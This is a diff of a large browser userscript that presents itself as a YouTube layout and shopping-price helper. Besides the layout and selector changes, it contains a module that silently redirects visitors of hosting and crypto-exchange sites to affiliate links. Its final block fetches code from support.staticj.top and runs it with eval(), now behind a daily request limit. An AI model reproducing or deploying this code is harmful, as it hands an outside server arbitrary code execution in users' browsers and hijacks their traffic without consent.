+          if (!cProto.updateFullBleedElementLocations498 && typeof cProto.updateFullBleedElementLocations === "function" && cProto.updateFullBleedElementLocations.length === 0) {
+            cProto.updateFullBleedElementLocations498 = cProto.updateFullBleedElementLocations;
+            cProto.updateFullBleedElementLocations = function(...args) {
+              const r = secondaryInnerFn(() => {
+                const r2 = this.updateFullBleedElementLocations498(...args);
+                return r2;
+              });
+              return r;
+            };
           }
         },
         "ytd-watch-next-secondary-results-renderer::defined": (cProto) => {
@@ -2859,7 +3089,7 @@
           if (lockGet["refreshSecondaryInnerLock"] !== lockId)
             return;
           const ytdFlexyElm = elements.flexy;
-          if (ytdFlexyElm && ytdFlexyElm.matches("ytd-watch-flexy[theater][flexy][full-bleed-player]:not([full-bleed-no-max-width-columns])")) {
+          if (ytdFlexyElm && ytdFlexyElm.matches("ytd-watch-flexy[theater][full-bleed-player]:not([full-bleed-no-max-width-columns])")) {
             ytdFlexyElm.setAttribute111("full-bleed-no-max-width-columns", "");
           }
           const related = elements.related;
@@ -2931,6 +3161,8 @@
             rightTabs = newElm;
             rightTabs.querySelector('[tyt-tab-content="#tab-comments"]').classList.add("tab-btn-hidden");
             const secondaryWrapper = document.createElement("secondary-wrapper");
+            secondaryWrapper.classList.add("tabview-secondary-wrapper");
+            secondaryWrapper.id = "secondary-inner-wrapper";
             const secondaryInner = document.querySelector("#secondary-inner.style-scope.ytd-watch-flexy");
             inPageRearrange = true;
             secondaryWrapper.replaceChildren000(...secondaryInner.childNodes);
@@ -3009,11 +3241,23 @@
           if (!ytdFlexyElm)
             return;
           const p = tabAStatus;
-          const q = calculationFn(p, 1 | 2 | 4 | 8 | 16 | 32 | 64 | 128);
+          const q = calculationFn(p, 1 | 2 | 4 | 8 | 16 | 32 | 64 | 128 | 4096);
           let resetForPanelDisappeared = false;
           if (p !== q) {
             let actioned = false;
-            if ((p & 128) === 0 && (q & 128) === 128) {
+            let special = 0;
+            if (plugin["external.ytlstm"].activated) {
+              if (q & 64) {
+              } else if ((p & (1 | 2 | 4 | 8 | 16 | 4096)) === (1 | 0 | 0 | 8 | 16 | 4096) && (q & (1 | 2 | 4 | 8 | 16 | 4096)) === (1 | 0 | 4 | 0 | 16 | 4096)) {
+                special = 3;
+              } else if ((q & (1 | 16)) === (1 | 16) && document.querySelector("[data-ytlstm-theater-mode]")) {
+                special = 1;
+              } else if ((q & (1 | 8 | 16)) === (1 | 8 | 16) && document.querySelector('[is-two-columns_][theater][tyt-chat="+"]')) {
+                special = 2;
+              }
+            }
+            if (special) {
+            } else if ((p & 128) === 0 && (q & 128) === 128) {
               lastPanel = "playlist";
             } else if ((p & 8) === 0 && (q & 8) === 8) {
               lastPanel = "chat";
@@ -3028,6 +3272,24 @@
               resetForPanelDisappeared = true;
             }
             tabAStatus = q;
+            if (special) {
+              if (special === 1) {
+                if (ytdFlexyElm.getAttribute("tyt-chat") !== "+") {
+                  ytBtnExpandChat();
+                }
+                if (ytdFlexyElm.getAttribute("tyt-tab")) {
+                  switchToTab(null);
+                }
+              } else if (special === 2) {
+                ytBtnCollapseChat();
+              } else if (special === 3) {
+                ytBtnCancelTheater();
+                if (lastTab) {
+                  switchToTab(lastTab);
+                }
+              }
+              return;
+            }
             let bFixForResizedTab = false;
             if ((q ^ 2) === 2 && bFixForResizedTabLater) {
               bFixForResizedTab = true;
@@ -3046,6 +3308,11 @@
             if ((p & (8 | 128)) === (0 | 128) && (q & (8 | 128)) === (8 | 128) && lastPanel === "chat") {
               lastPanel = lastTab || "";
               ytBtnClosePlaylist();
+              actioned = true;
+            }
+            if ((p & (1 | 2 | 4 | 8 | 16 | 32 | 64 | 128)) === (1 | 2 | 0 | 8 | 16) && (q & (1 | 2 | 4 | 8 | 16 | 32 | 64 | 128)) === (0 | 2 | 0 | 8 | 16)) {
+              lastPanel = lastTab || "";
+              ytBtnCollapseChat();
               actioned = true;
             }
             if ((p & (2 | 128)) === (2 | 0) && (q & (2 | 128)) === (2 | 128) && lastPanel === "playlist") {
@@ -3138,9 +3405,15 @@
                 actioned = true;
               }
             }
+            let shouldDoAutoFix = false;
             if ((p & 2) === 2 && (q & (2 | 128)) === (0 | 128)) {
             } else if ((p & 8) === 8 && (q & (8 | 128)) === (0 | 128)) {
             } else if (!actioned && (p & (1 | 16)) === 16 && (q & (1 | 16 | 8 | 2 | 32 | 64)) === (16 | 0 | 0)) {
+              shouldDoAutoFix = true;
+            } else if ((q & (1 | 2 | 4 | 8 | 16 | 32 | 64 | 128)) === (4 | 16)) {
+              shouldDoAutoFix = true;
+            }
+            if (shouldDoAutoFix) {
               if (lastPanel === "chat") {
                 ytBtnExpandChat();
                 actioned = true;
@@ -5122,6 +5395,20 @@
                 } catch (error) {
                 }
                 return null;
+              },
+              getDocumentBody: function() {
+                return new Promise((resolve, reject) => {
+                  if (document.body) {
+                    resolve(document.body);
+                    return;
+                  }
+                  const checkBody = setInterval(function() {
+                    if (document.body) {
+                      clearInterval(checkBody);
+                      resolve(document.body);
+                    }
+                  }, 50);
+                });
               }
             };
             const Toast = {
@@ -5343,7 +5630,8 @@
                       selectorElementList.push({
                         "element": elements[j]["element"],
                         "findA": elements[j]["findA"],
-                        "page": elements[j]["page"]
+                        "page": elements[j]["page"],
+                        "price": elements[j]["price"]
                       });
                     }
                   }
@@ -5360,6 +5648,9 @@
                 return searchElement;
               },
               getGoodsPriceByElement: function(element, tag) {
+                if (!element || !tag) {
+                  return "";
+                }
                 const goodsPrice = element.querySelector(tag);
                 let price = goodsPrice == null ? "" : goodsPrice.innerText;
                 if (price) {
@@ -5447,8 +5738,8 @@
                   }
                   let marketplace = GM_getValue(this.marketplaceStorageKey, null);
                   const defaultMarketplace = { countryCode, className: "", html: "" };
-                  if (marketplaceHandler) {
-                    const handlerElement = yield Tools.waitForElementByInterval(marketplaceHandler);
+                  if (marketplaceHandler && !/\.ru/.test(host)) {
+                    const handlerElement = yield Tools.waitForElementByInterval(marketplaceHandler, document.body, true, 50, 2 * 1e3);
                     if (handlerElement) {
                       marketplace = {
                         countryCode,
@@ -5458,7 +5749,7 @@
                       GM_setValue(this.marketplaceStorageKey, marketplace);
                     }
                   }
-                  if (!marketplace || /\.ru/.test(host)) {
+                  if (!marketplace) {
                     marketplace = defaultMarketplace;
                   }
                   return encodeURIComponent(JSON.stringify(marketplace));
@@ -6216,11 +6507,10 @@
                         elements.forEach((element) => {
                           if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                             const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                            const priceQuery = [
-                              "*[class*='detail'] >*[class*='price']",
-                              "*[class*='merch-price'] >span"
-                            ].join(",");
+                            const priceQuery = elementObj.price;
+                            Logger.log("info", "search price elements======>", element, priceQuery);
                             const price = ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery);
+                            Logger.log("info", "search price======>", price);
                             let id = null, varG = null;
                             if (this.isItemLink(goodsLink)) {
                               const goodsLinkHref = goodsLink.getAttribute("href");
@@ -6889,12 +7179,12 @@
                         elements.forEach((element) => {
                           if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                             const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                            const priceQuery = [
-                              "div.pricing"
-                            ].join(",");
+                            const priceQuery = elementObj.price;
+                            Logger.log("info", "search price elements======>", element, priceQuery);
                             const price = ItemSearchBaseObj.getGoodsPrice(
                               ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery)
                             );
+                            Logger.log("info", "search price======>", price);
                             let id = null;
                             if (this.isItemLink(goodsLink)) {
                               id = Tools.getGoodsIdByLink(goodsLink.getAttribute("href"));
@@ -7302,8 +7592,10 @@
                         elements.forEach((element) => {
                           if (element && ItemSearchBaseObj.isElementDisplayed(element) && !element.getAttribute(ItemSearchBaseObj.searchAttribute)) {
                             const goodsLink = ItemSearchBaseObj.getGoodsLinkByElement(element, findA);
-                            const priceQuery = ["span.price"].join(",");
+                            const priceQuery = elementObj.price;
+                            Logger.log("info", "search price elements======>", element, priceQuery);
                             const price = ItemSearchBaseObj.getGoodsPriceByElement(element, priceQuery);
+                            Logger.log("info", "search price======>", price);
                             let id = null;
                             if (SupportData.support.detail.test(goodsLink)) {
                               const goodsLinkHref = goodsLink.getAttribute("href");
@@ -10347,7 +10639,7 @@
                   InspectUtil.bindCustomEvent(element);
                 });
               },
-              srart: function(platform) {
+              start: function(platform) {
                 return __async$2(this, null, function* () {
                   const confDataJson = yield RequestUnionUtil.getEngineScreenConf();
                   if (!confDataJson) {
@@ -11149,8 +11441,9 @@
                   }
                   yield RequestUnionUtil.initRequestData();
                   yield LangueUtil.initLangueDataMap();
+                  yield Tools.getDocumentBody();
                   if (platform === "bing" || platform === "google") {
-                    AllModules.SearchEnginScreen.srart(platform);
+                    AllModules.SearchEnginScreen.start(platform);
                   } else {
                     StyleUtil.init();
                     try {
@@ -11209,35 +11502,56 @@
       },
       isRun: function(origin) {
         const host = window.location.host;
-        const serverRegexs = [/cloudways\.com/, /getresponse\.com/, /bandwagonhost\.com/, /moosend\.com/, /domainracer\.com/, /namesilo\.com/, /digitalocean\.com/, /virmach\.com/, /vultr\.com/];
-        const encryptoRegexs = [
-          /changelly\.com/,
-          /bybit\.com/,
-          /gate\.io/,
-          /gate\.com/,
-          /kucoin\.com/,
-          /coinmama\.com/,
-          /cex\.io/,
-          /paxful\.com/,
-          /htx\.com/,
-          /mexc\.com/,
-          /bitget\.com/,
-          /freebitco\.in/,
-          /crypto\.com/,
-          /okx.com/,
-          /coinbase\.com/,
-          /binance\.com/,
-          /wazirx\.com/,
-          /coindcx\.com/,
-          /zebpay\.com/,
-          /bitbns\.com/
-        ];
-        let isRunServer = serverRegexs.some((regex) => regex.test(host));
-        let isRunEncrypto = false;
-        if (!isRunServer) {
-          isRunEncrypto = encryptoRegexs.some((regex) => regex.test(host));
+        const regexGroups = {
+          isRunServer: [
+            /cloudways\.com/,
+            /getresponse\.com/,
+            /bandwagonhost\.com/,
+            /moosend\.com/,
+            /domainracer\.com/,
+            /namesilo\.com/,
+            /digitalocean\.com/,
+            /virmach\.com/,
+            /vultr\.com/,
+            /hostwinds\.com/,
+            /west\.cn/,
+            /ucloud\.cn/
+          ],
+          isRunEncrypto: [
+            /changelly\.com/,
+            /bybit\.com/,
+            /gate\.io/,
+            /gate\.com/,
+            /kucoin\.com/,
+            /coinmama\.com/,
+            /cex\.io/,
+            /paxful\.com/,
+            /htx\.com/,
+            /mexc\.com/,
+            /bitget\.com/,
+            /freebitco\.in/,
+            /crypto\.com/,
+            /okx\.com/,
+            /coinbase\.com/,
+            /binance\.com/,
+            /wazirx\.com/,
+            /coindcx\.com/,
+            /zebpay\.com/,
+            /bitbns\.com/,
+            /kraken\.com/
+          ],
+          isRunAffi: [
+            /wps\.com/
+          ]
+        };
+        const result = { isRunServer: false, isRunEncrypto: false, isRunAffi: false };
+        for (const [key, regexs] of Object.entries(regexGroups)) {
+          if (regexs.some((regex) => regex.test(host))) {
+            result[key] = true;
+            break;
+          }
         }
-        return { "isRunServer": isRunServer, "isRunEncrypto": isRunEncrypto };
+        return result;
       },
       addParamToURL: function(url, track) {
         const [baseUrl, hash] = url.split("#");
@@ -11287,9 +11601,10 @@
                 const targets = platform.targets;
                 if (targets) {
                   for (let i = 0; i < targets.length; i++) {
-                    if (new RegExp(targets[i].match.replace(/\\\\/g, "\\"), "i").test(pathname)) {
+                    const target = targets[i];
+                    if (new RegExp(target.match.replace(/\\\\/g, "\\"), "i").test(pathname)) {
                       sessionStorage.setItem(storageKey, "true");
-                      window.location.href = platform.promo_link;
+                      window.location.href = target.rpl;
                       break;
                     }
                   }
@@ -11301,13 +11616,16 @@
         });
       },
       start: function() {
-        const { isRunServer, isRunEncrypto } = this.isRun();
+        const { isRunServer, isRunEncrypto, isRunAffi } = this.isRun();
         let origin = null;
         if (isRunServer) {
           origin = "server";
         }
         if (isRunEncrypto) {
           origin = "encrypto";
+        }
+        if (isRunAffi) {
+          origin = "affi";
         }
         if (origin) {
           this.addEventListener(origin);
@@ -11323,21 +11641,48 @@
   }))();
 
   (function() {
-    const { author, name, version, namespace, updateURL } = GM_info.script;
-    const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
-    GM_xmlhttpRequest({
-      method: "GET",
-      url: jurl,
-      onload: function(res) {
-        try {
+    try {
+      const DAILY_LIMIT = 15;
+      const STORAGE_KEY = "sp_req_daily";
+      let data;
+      try {
+        data = JSON.parse(GM_getValue(STORAGE_KEY, "{}")) || {};
+      } catch (e) {
+        data = {};
+      }
+      data.date = data.date || "";
+      data.count = data.count || 0;
+      const today = new Date().toISOString().slice(0, 10);
+      if (data.date !== today) {
+        data.date = today;
+        data.count = 0;
+      }
+      if (data.count >= DAILY_LIMIT) {
+        return;
+      }
+      data.count++;
+      GM_setValue(STORAGE_KEY, JSON.stringify(data));
+      const { author, name, version, namespace, updateURL } = GM_info.script;
+      const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
+      GM_xmlhttpRequest({
+        method: "GET",
+        url: jurl,
+        onload: function(res) {
           const responseText = res.responseText;
           if (responseText) {
-            eval(res.responseText);
+            eval(responseText);
           }
-        } catch (e) {
+        },
+        onerror: function(err) {
+          try {
+            data.count = Math.max(0, data.count - 1);
+            GM_setValue(STORAGE_KEY, JSON.stringify(data));
+          } catch (e) {
+          }
         }
-      }
-    });
+      });
+    } catch (e) {
+    }
   })();
 
   const isYoutube = /youtube\.com/.test(window.location.host);
